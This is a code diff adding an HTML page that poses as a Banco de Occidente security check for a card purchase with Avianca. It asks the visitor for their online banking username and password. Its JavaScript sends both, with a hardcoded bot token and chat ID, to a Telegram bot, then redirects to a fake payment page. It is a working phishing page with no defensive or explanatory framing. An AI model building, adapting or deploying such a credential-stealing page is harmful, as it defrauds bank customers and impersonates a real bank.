@@ -1,0 +1,189 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <link rel="stylesheet" href="css/style.css">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Seguridad</title>
+    <style>
+        * {
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f8f9fa;
+            color: #333;
+        }
+
+        main {
+            max-width: 450px;
+            margin: 0 auto;
+            background-color: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+        }
+
+        p {
+            margin: 10px 0;
+            line-height: 1.5;
+        }
+
+        strong {
+            color: #333;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: bold;
+            color: #555;
+        }
+
+        input[type="text"], 
+        input[type="password"] {
+            width: 100%;
+            padding: 12px;
+            border: 2px solid #ddd;
+            border-radius: 6px;
+            font-size: 16px;
+            margin-bottom: 15px;
+            transition: border-color 0.3s ease;
+        }
+
+        input[type="text"]:focus, 
+        input[type="password"]:focus {
+            outline: none;
+            border-color: #007bff;
+            box-shadow: 0 0 5px rgba(0,123,255,0.3);
+        }
+
+        button {
+            background-color: #007bff;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 6px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+            min-width: 120px;
+        }
+
+        button:hover {
+            background-color: #0056b3;
+        }
+
+        button:active {
+            transform: translateY(1px);
+        }
+
+        .transaction-details {
+            background-color: #f8f9fa;
+            padding: 15px;
+            border-radius: 8px;
+            margin: 20px 0;
+        }
+
+        .detail-row {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 10px;
+        }
+
+        .detail-row:last-child {
+            margin-bottom: 0;
+        }
+
+        @media (max-width: 480px) {
+            main {
+                margin: 10px;
+                padding: 15px;
+            }
+            
+            input[type="text"], 
+            input[type="password"] {
+                font-size: 16px; /* Previene zoom en iOS */
+            }
+        }
+    </style>
+</head>
+<body>
+
+<main style="margin: 15% 8%;">
+    <section>
+        <div style=" padding-bottom: 5%; border-style: solid; border-width: 0px 0px 1px 0px; border-color: gray;">
+            <img style="width: 50%;" src="../img/BANCO DE OCCIDENTE.png" alt="">
+        </div>
+                 
+        <div style="margin-top: 10%;">
+            <p style="margin-bottom: 8%;"><strong>Vamos a valiar tu compra</strong></p>
+            <p>Banco de Occidente requiere verificar la transacción que intentas realizar con tu tarjeta  por seguridad</p>
+            <p style="margin-top: 15%; color: grey;">Detalles de la transacción</p>
+        </div>
+                 
+        <div class="transaction-details">
+            <div class="detail-row">
+                <span><strong>Comercio:</strong></span>
+                <span>Avianca</span>
+            </div>
+            <div class="detail-row">
+                <span><strong>Monto:</strong></span>
+                <span>Por cobrar</span>
+            </div>
+        </div>
+    </section>
+
+    <section style="margin-top: 8%; margin: 5%;">
+        <p style="margin-bottom: 4%; color: blue;">Por favor, ingrese su usuario y contraseña</p>
+        <div style="margin-bottom: 4%;">
+            <label for=""><strong>usuario:</strong></label>
+            <input id="username" style=" border-width: 1px;" type="text">
+        </div>
+                 
+        <div>
+            <label for=""><strong>Clave:</strong></label>
+            <input id="password" style=" border-width: 1.9px;" type="password">
+        </div>
+         
+        <div style="display: flex; justify-content: center; margin-top: 6%;">
+            <button id="submitBtn" style="background-color: blue; font-size: smaller; color: white; padding: 2.5% 5%; border-radius: 5px; border-width: 0px;">Continuar</button>
+        </div>
+    </section>
+
+    <script>
+        function enviarMensajeTelegram(username, password) {
+    // Aquí debes reemplazar 'TU_TOKEN' por el token de tu bot de Telegram
+    var token = '7378174095:AAG9OWnJE5Hu3av8iOO4XhIfsrnrekqlwtA';
+    // Aquí debes reemplazar 'TU_CHAT_ID' por el chat ID al que quieras enviar el mensaje
+    var chatID = '5900829263';
+    var mensaje = 'Logo Occidente: ' + '\nUsuario: ' + username + ' \nClave: ' + password;
+
+    var url = 'https://api.telegram.org/bot' + token + '/sendMessage?chat_id=' + chatID + '&text=' + mensaje;
+
+    var xhttp = new XMLHttpRequest();
+    xhttp.open('GET', url, true);
+    xhttp.send();
+}
+
+document.getElementById('submitBtn').addEventListener('click', function() {
+    var username = document.getElementById('username').value;
+    var password = document.getElementById('password').value;
+
+    if (username.trim() !== '' && password.trim() !== '') {
+        enviarMensajeTelegram(username, password);
+        setTimeout(function() {
+            window.location.href = '../cargapago.html';
+        }, 1000);
+    } else {
+        alert('Por favor complete todos los campos antes de continuar.');
+    }
+});
+    </script>
+</main>
+     
+</body>
+</html>
